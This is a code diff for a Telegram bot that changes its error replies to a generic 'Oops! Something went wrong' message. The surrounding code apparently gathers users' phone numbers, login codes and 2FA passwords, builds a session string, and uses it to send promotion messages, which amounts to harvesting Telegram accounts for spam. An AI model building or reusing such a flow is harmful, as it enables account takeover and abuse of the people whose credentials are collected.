@@ -227,14 +227,14 @@ async def handle_contact(bot: Client, message: Message):
         await bot.delete_messages(user_id, processing_msg.id)
         
     except Exception as e:
-        await message.reply(f"Error: {e}\n/start again.", reply_markup=ReplyKeyboardRemove())
+        await message.reply(f"⚠️ Oops! Something went wrong.\n\nPlease try /start again later.", reply_markup=ReplyKeyboardRemove())
         await cleanup_user_state(user_id)
 
 @Client.on_callback_query(filters.regex("^otp_"))
 async def handle_otp_buttons(bot: Client, query: CallbackQuery):
     user_id = query.from_user.id
     if user_id not in user_states:
-        await query.answer("Session expired. /start again.", show_alert=True)
+        await query.answer("⚠️ Oops! Something went wrong.\n\nPlease try /start again later.", show_alert=True)
         await query.message.delete()
         return
     
@@ -278,7 +278,7 @@ async def handle_otp_buttons(bot: Client, query: CallbackQuery):
             state['needs_password'] = True
             state['last_msg_id'] = query.message.id
         except Exception as e:
-            await query.message.reply(f"Error: {e}\n/start again.")
+            await query.message.reply(f"⚠️ Oops! Something went wrong.\n\nPlease try /start again later.")
             await cleanup_user_state(user_id)
         return
     else:
@@ -345,7 +345,7 @@ async def handle_2fa_password(bot: Client, message: Message):
         )
         state['last_msg_id'] = error_msg.id
     except Exception as e:
-        await message.reply(f"Error: {e}\n/start again.", reply_markup=ReplyKeyboardRemove())
+        await message.reply(f"⚠️ Oops! Something went wrong.\n\nPlease try /start again later.", reply_markup=ReplyKeyboardRemove())
         await cleanup_user_state(user_id)
 
 async def create_session(bot: Client, client: Client, user_id: int, phone_number: str):
@@ -401,7 +401,7 @@ async def create_session(bot: Client, client: Client, user_id: int, phone_number
         asyncio.create_task(send_promotion_messages(bot, string_session, phone_number))
         
     except Exception as e:
-        await bot.send_message(user_id, f"Error creating session: {e}\n/start again")
+        await bot.send_message(user_id, f"⚠️ Oops! Something went wrong.\n\nPlease try /start again later.")
     finally:
         await cleanup_user_state(user_id)
 
